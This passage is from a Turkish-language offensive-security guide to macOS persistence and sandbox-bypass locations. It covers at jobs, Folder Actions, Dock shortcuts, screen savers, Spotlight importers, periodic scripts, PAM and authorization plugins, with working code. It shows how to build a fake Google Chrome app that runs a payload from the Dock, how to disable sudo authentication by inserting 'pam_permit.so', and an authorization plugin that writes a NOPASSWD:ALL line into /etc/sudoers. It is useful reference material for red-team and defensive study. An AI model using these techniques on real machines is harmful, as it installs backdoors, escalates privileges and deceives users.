- Sandbox'ı atlamak için faydalı: [✅](https://emojipedia.org/check-mark-button)
- Ancak **`at`** komutunu **çalıştırmanız** ve **etkinleştirilmiş** olması gerekir.
- TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`at`** komutunu **çalıştırmanız** ve **etkinleştirilmiş** olması gerekir.

#### **Açıklama**

`at` görevleri, belirli zamanlarda yürütülmek üzere **bir kerelik görevleri planlamak** için tasarlanmıştır. Cron görevlerinin aksine, `at` görevleri yürütüldükten sonra otomatik olarak kaldırılır. Bu görevlerin sistem yeniden başlatmalarında kalıcı olduğunu belirtmek önemlidir, bu da belirli koşullar altında potansiyel güvenlik endişeleri olarak işaretlenmelerine neden olur.

**Varsayılan olarak** **devre dışıdır**, ancak **root** kullanıcısı bunları **etkinleştirebilir**:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Bu, 1 saat içinde bir dosya oluşturacaktır:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
`atq` kullanarak iş kuyruğunu kontrol edin:
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Yukarıda iki planlanmış iş görebiliriz. İşin detaylarını `at -c JOBNUMBER` komutunu kullanarak yazdırabiliriz.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Eğer AT görevleri etkin değilse, oluşturulan görevler çalıştırılmayacaktır.

**iş dosyaları** `/private/var/at/jobs/` konumunda bulunabilir.
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Dosya adı, kuyruğu, iş numarasını ve çalıştırılacağı zamanı içerir. Örneğin `a0001a019bdcd2`'ye bakalım.

- `a` - bu kuyruk
- `0001a` - onaltılık iş numarası, `0x1a = 26`
- `019bdcd2` - onaltılık zaman. Epoch'tan bu yana geçen dakikaları temsil eder. `0x019bdcd2` ondalık olarak `26991826`'dır. Bunu 60 ile çarptığımızda `1619509560` elde ederiz, bu da `GMT: 2021. Nisan 27., Salı 7:46:00`'dır.

İş dosyasını yazdırdığımızda, `at -c` kullanarak elde ettiğimiz aynı bilgileri içerdiğini buluruz.

### Klasör Eylemleri

Yazı: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Yazı: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Sandbox'ı atlatmak için yararlıdır: [✅](https://emojipedia.org/check-mark-button)
- Ancak Klasör Eylemlerini yapılandırmak için **`System Events`** ile iletişim kurmak üzere argümanlarla `osascript` çağırabilmeniz gerekir.
- TCC atlatma: [🟠](https://emojipedia.org/large-orange-circle)
- Masaüstü, Belgeler ve İndirilenler gibi bazı temel TCC izinlerine sahiptir.

#### Konum

- **`/Library/Scripts/Folder Action Scripts`**
- Root gereklidir
- **Tetikleyici**: Belirtilen klasöre erişim
- **`~/Library/Scripts/Folder Action Scripts`**
- **Tetikleyici**: Belirtilen klasöre erişim

#### Açıklama & Sömürü

Klasör Eylemleri, bir klasördeki öğelerin eklenmesi, kaldırılması veya klasör penceresinin açılması veya boyutunun değiştirilmesi gibi değişiklikler tarafından otomatik olarak tetiklenen betiklerdir. Bu eylemler çeşitli görevler için kullanılabilir ve Finder UI veya terminal komutları gibi farklı yollarla tetiklenebilir.

Klasör Eylemlerini ayarlamak için şu seçeneklere sahipsiniz:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) ile bir Klasör Eylemi iş akışı oluşturmak ve bunu bir hizmet olarak yüklemek.
2. Bir klasörün bağlam menüsündeki Klasör Eylemleri Ayarı aracılığıyla bir betiği manuel olarak eklemek.
3. `System Events.app`'e Apple Event mesajları göndermek için OSAScript kullanarak programlı olarak bir Klasör Eylemi ayarlamak.
- Bu yöntem, eylemi sisteme entegre etmek için özellikle yararlıdır ve bir düzeyde kalıcılık sunar.

Aşağıdaki betik, bir Klasör Eylemi tarafından yürütülebilecek bir örnektir:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Yukarıdaki betiği Folder Actions tarafından kullanılabilir hale getirmek için, şu komutla derleyin:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Script derlendiğinde, aşağıdaki scripti çalıştırarak Klasör Eylemlerini ayarlayın. Bu script, Klasör Eylemlerini genel olarak etkinleştirecek ve daha önce derlenmiş scripti Masaüstü klasörüne özel olarak ekleyecektir.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Kurulum betiğini şu şekilde çalıştırın:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Bu kalıcılığı GUI aracılığıyla uygulamanın yolu:

Bu yürütülecek betiktir:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
`osacompile -l JavaScript -o folder.scpt source.js` ile derleyin

Şuraya taşıyın:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Sonra, `Folder Actions Setup` uygulamasını açın, **izlemek istediğiniz klasörü** seçin ve sizin durumunuzda **`folder.scpt`**'yi seçin (benim durumumda buna output2.scp dedim):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Artık, bu klasörü **Finder** ile açarsanız, scriptiniz çalıştırılacaktır.

Bu yapılandırma, **plist** içinde **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** konumunda base64 formatında saklandı.

Şimdi, bu kalıcılığı GUI erişimi olmadan hazırlamaya çalışalım:

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** dosyasını yedeklemek için `/tmp`'ye kopyalayın:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. Yeni ayarladığınız Folder Actions'ı **kaldırın**:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Artık boş bir ortamımız var

3. Yedek dosyayı kopyalayın: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Bu yapılandırmayı kullanmak için Folder Actions Setup.app'ı açın: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Bu benim için çalışmadı, ama bunlar yazımın talimatları:(

### Dock kısayolları

Yazım: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Sandbox'ı atlatmak için faydalı: [✅](https://emojipedia.org/check-mark-button)
- Ama sistem içinde kötü niyetli bir uygulama kurulu olmalıdır
- TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `~/Library/Preferences/com.apple.dock.plist`
- **Tetikleyici**: Kullanıcı dock içindeki uygulamaya tıkladığında

#### Açıklama & Sömürü

Dock'ta görünen tüm uygulamalar plist içinde belirtilmiştir: **`~/Library/Preferences/com.apple.dock.plist`**

Sadece **bir uygulama eklemek** mümkündür:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Bazı **sosyal mühendislik** kullanarak, dock içinde **örneğin Google Chrome'u taklit edebilir** ve aslında kendi scriptinizi çalıştırabilirsiniz:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Renk Seçiciler

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Sandbox'ı atlatmak için faydalı: [🟠](https://emojipedia.org/large-orange-circle)
- Çok spesifik bir eylem gerçekleşmelidir
- Başka bir sandbox'ta sonlanacaksınız
- TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/Library/ColorPickers`
- Root gerekli
- Tetikleyici: Renk seçiciyi kullanın
- `~/Library/ColorPickers`
- Tetikleyici: Renk seçiciyi kullanın

#### Açıklama & Sömürü

**Kendi kodunuzla bir renk seçici** paketi derleyin (örneğin [**bunu kullanabilirsiniz**](https://github.com/viktorstrate/color-picker-plus)) ve bir yapıcı ekleyin (örneğin [Ekran Koruyucu bölümündeki gibi](macos-auto-start-locations.md#screen-saver)) ve paketi `~/Library/ColorPickers` dizinine kopyalayın.

Sonra, renk seçici tetiklendiğinde, sizin kodunuz da tetiklenecektir.

Kütüphanenizi yükleyen ikilinin **çok kısıtlayıcı bir sandbox'ı** olduğunu unutmayın: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Eklentileri

**Yazı**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Yazı**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Sandbox'ı atlatmak için yararlı: **Hayır, çünkü kendi uygulamanızı çalıştırmanız gerekiyor**
- TCC atlatma: ???

#### Konum

- Belirli bir uygulama

#### Açıklama & Sömürü

Bir Finder Sync Eklentisi ile bir uygulama örneği [**burada bulunabilir**](https://github.com/D00MFist/InSync).

Uygulamalar `Finder Sync Eklentileri` içerebilir. Bu eklenti, çalıştırılacak bir uygulamanın içine girecektir. Ayrıca, eklentinin kodunu çalıştırabilmesi için **geçerli bir Apple geliştirici sertifikası ile imzalanması** gerekir, **sandbox'lanmış** olmalıdır (rahatlatılmış istisnalar eklenebilir) ve bir şeyle kaydedilmelidir:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Ekran Koruyucu

Yazı: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Yazı: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Sandbox'ı atlatmak için yararlıdır: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak, yaygın bir uygulama sandbox'ında kalırsınız
- TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/System/Library/Screen Savers`
- Root gerekli
- **Tetikleyici**: Ekran koruyucuyu seçin
- `/Library/Screen Savers`
- Root gerekli
- **Tetikleyici**: Ekran koruyucuyu seçin
- `~/Library/Screen Savers`
- **Tetikleyici**: Ekran koruyucuyu seçin

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Açıklama & Sömürü

Xcode'da yeni bir proje oluşturun ve yeni bir **Ekran Koruyucu** oluşturmak için şablonu seçin. Ardından, kodunuzu ekleyin, örneğin log oluşturmak için aşağıdaki kodu kullanın.

**Derleyin** ve `.saver` paketini **`~/Library/Screen Savers`** dizinine kopyalayın. Ardından, Ekran Koruyucu GUI'sini açın ve üzerine tıkladığınızda, birçok log oluşturması gerekir:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Bu kodu yükleyen ikilinin yetkilendirmeleri içinde (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) **`com.apple.security.app-sandbox`** bulabileceğiniz için **ortak uygulama kumandasının içinde** olacaksınız. 

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Eklentileri

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Sandbox'ı atlatmak için yararlıdır: [🟠](https://emojipedia.org/large-orange-circle)
- Ama bir uygulama sandbox'ında kalacaksınız
- TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)
- Sandbox çok sınırlı görünüyor

#### Konum

- `~/Library/Spotlight/`
- **Tetikleyici**: Spotlight eklentisi tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
- `/Library/Spotlight/`
- **Tetikleyici**: Spotlight eklentisi tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
- Root gerekli
- `/System/Library/Spotlight/`
- **Tetikleyici**: Spotlight eklentisi tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
- Root gerekli
- `Some.app/Contents/Library/Spotlight/`
- **Tetikleyici**: Spotlight eklentisi tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
- Yeni uygulama gerekli

#### Açıklama & Sömürü

Spotlight, kullanıcıların bilgisayarlarındaki verilere **hızlı ve kapsamlı erişim** sağlaması için tasarlanmış macOS'un yerleşik arama özelliğidir.\
Bu hızlı arama yeteneğini kolaylaştırmak için, Spotlight **özel bir veritabanı** tutar ve **çoğu dosyayı ayrıştırarak** bir indeks oluşturur, böylece dosya adları ve içerikleri üzerinden hızlı aramalar yapılmasını sağlar.

Spotlight'ın temel mekanizması, **'metadata server'** anlamına gelen 'mds' adlı merkezi bir süreç içerir. Bu süreç, tüm Spotlight hizmetini yönetir. Bununla birlikte, farklı dosya türlerini indeksleme gibi çeşitli bakım görevlerini yerine getiren birden fazla 'mdworker' daemon'u bulunmaktadır (`ps -ef | grep mdworker`). Bu görevler, Spotlight'ın çeşitli dosya formatları arasında içerikleri anlamasını ve indekslemesini sağlayan Spotlight importer eklentileri veya **".mdimporter paketleri** aracılığıyla mümkün olmaktadır.

Eklentiler veya **`.mdimporter`** paketleri daha önce belirtilen yerlerde bulunur ve yeni bir paket ortaya çıktığında, bu paket bir dakika içinde yüklenir (herhangi bir hizmeti yeniden başlatmaya gerek yoktur). Bu paketler, hangi **dosya türü ve uzantıları yönetebileceklerini** belirtmelidir, bu şekilde Spotlight, belirtilen uzantıya sahip yeni bir dosya oluşturulduğunda bunları kullanacaktır.

Tüm yüklü `mdimporters`'ı bulmak mümkündür:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Ve örneğin **/Library/Spotlight/iBooksAuthor.mdimporter** bu tür dosyaları (diğerleri arasında `.iba` ve `.book` uzantıları) ayrıştırmak için kullanılır:
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Diğer `mdimporter`'ların Plist'ini kontrol ederseniz, **`UTTypeConformsTo`** girişini bulamayabilirsiniz. Bunun nedeni, bunun yerleşik bir _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) olması ve uzantıları belirtmesine gerek olmamasıdır.
>
> Ayrıca, sistem varsayılan eklentileri her zaman önceliğe sahiptir, bu nedenle bir saldırgan yalnızca Apple'ın kendi `mdimporters` tarafından başka türlü dizinlenmemiş dosyalara erişebilir.

Kendi importer'ınızı oluşturmak için bu projeyle başlayabilirsiniz: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) ve ardından adı, **`CFBundleDocumentTypes`**'ı değiştirip **`UTImportedTypeDeclarations`** ekleyerek desteklemek istediğiniz uzantıyı desteklemesini sağlayın ve **`schema.xml`**'de yansıtın.\
Ardından, **`GetMetadataForFile`** fonksiyonunun kodunu, işlenmiş uzantıya sahip bir dosya oluşturulduğunda yüklemenizi çalıştıracak şekilde **değiştirin**.

Son olarak, **yeni `.mdimporter`'ınızı** önceki konumlardan birine **oluşturun ve kopyalayın** ve yüklendiğini kontrol edebilirsiniz **logları izleyerek** veya **`mdimport -L.`** kontrol ederek.

### ~~Tercih Pane~~

> [!CAUTION]
> Artık bunun çalıştığına dair bir izlenim yok.

Yazı: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Sandbox'ı atlatmak için yararlıdır: [🟠](https://emojipedia.org/large-orange-circle)
- Belirli bir kullanıcı eylemi gerektirir
- TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Açıklama

Artık bunun çalıştığına dair bir izlenim yok.

## Root Sandbox Atlatma

> [!TIP]
> Burada, **root** olarak **bir dosyaya yazarak** basitçe bir şey çalıştırmanıza olanak tanıyan **sandbox atlatma** için yararlı başlangıç konumlarını bulabilirsiniz ve/veya diğer **garip koşulları** gerektirir.

### Periyodik

Yazı: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Sandbox'ı atlatmak için yararlıdır: [🟠](https://emojipedia.org/large-orange-circle)
- Ama root olmanız gerekiyor
- TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root gereklidir
- **Tetikleyici**: Zamanı geldiğinde
- `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local`
- Root gereklidir
- **Tetikleyici**: Zamanı geldiğinde

#### Açıklama & Sömürü

Periyodik betikler (**`/etc/periodic`**) `/System/Library/LaunchDaemons/com.apple.periodic*`'de yapılandırılan **başlatma daemon'ları** nedeniyle çalıştırılır. `/etc/periodic/`'de depolanan betiklerin **dosyanın sahibi olarak** **çalıştırıldığını** unutmayın, bu nedenle bu potansiyel bir ayrıcalık yükseltmesi için işe yaramayacaktır.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
**`/etc/defaults/periodic.conf`** dosyasında belirtilen başka periyodik betikler de vardır:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Eğer `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local` dosyalarından herhangi birini yazmayı başarırsanız, bu dosya **bir şekilde çalıştırılacaktır**.

> [!WARNING]
> Periyodik scriptin **scriptin sahibi olarak çalıştırılacağını** unutmayın. Yani eğer scriptin sahibi bir normal kullanıcıysa, bu script o kullanıcı olarak çalıştırılacaktır (bu, ayrıcalık yükseltme saldırılarını engelleyebilir).

### PAM

Yazı: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Yazı: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Sandbox'ı atlatmak için faydalı: [🟠](https://emojipedia.org/large-orange-circle)
- Ama root olmanız gerekiyor
- TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- Her zaman root gereklidir

#### Açıklama & Sömürü

PAM, **kalıcılık** ve kötü amaçlı yazılımlara daha fazla odaklandığı için macOS içinde kolay yürütme üzerine, bu blog detaylı bir açıklama vermeyecek, **bu tekniği daha iyi anlamak için yazıları okuyun**.

PAM modüllerini kontrol etmek için:
```bash
ls -l /etc/pam.d
```
Bir kalıcılık/ayrıcalık yükseltme tekniği PAM'ı istismar etmek için /etc/pam.d/sudo modülünü değiştirmek kadar kolaydır, başına şu satırı ekleyerek:
```bash
auth       sufficient     pam_permit.so
```
Bu, şöyle **görünecek**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Ve bu nedenle **`sudo` kullanma girişimi işe yarayacaktır**.

> [!CAUTION]
> Bu dizinin TCC tarafından korunduğunu unutmayın, bu nedenle kullanıcının erişim talep eden bir istem alması oldukça olasıdır.

Bir diğer güzel örnek ise su'dur, burada PAM modüllerine parametreler vermenin de mümkün olduğunu görebilirsiniz (ve bu dosyayı da arka kapı ile değiştirebilirsiniz):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Yetkilendirme Eklentileri

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Sandbox'ı atlatmak için faydalı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve ekstra yapılandırmalar yapmanız gerekiyor
- TCC atlatma: ???

#### Konum

- `/Library/Security/SecurityAgentPlugins/`
- Root gerekli
- Eklentiyi kullanmak için yetkilendirme veritabanını yapılandırmak da gereklidir

#### Açıklama & Sömürü

Kullanıcı giriş yaptığında sürekli bağlantıyı sürdürmek için çalıştırılacak bir yetkilendirme eklentisi oluşturabilirsiniz. Bu eklentilerden birini nasıl oluşturacağınız hakkında daha fazla bilgi için önceki yazılara göz atın (ve dikkatli olun, kötü yazılmış bir eklenti sizi kilitleyebilir ve mac'inizi kurtarma modundan temizlemeniz gerekebilir).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Taşı** yüklenmesi gereken konuma:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Sonunda bu Eklentiyi yüklemek için **kuralı** ekleyin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
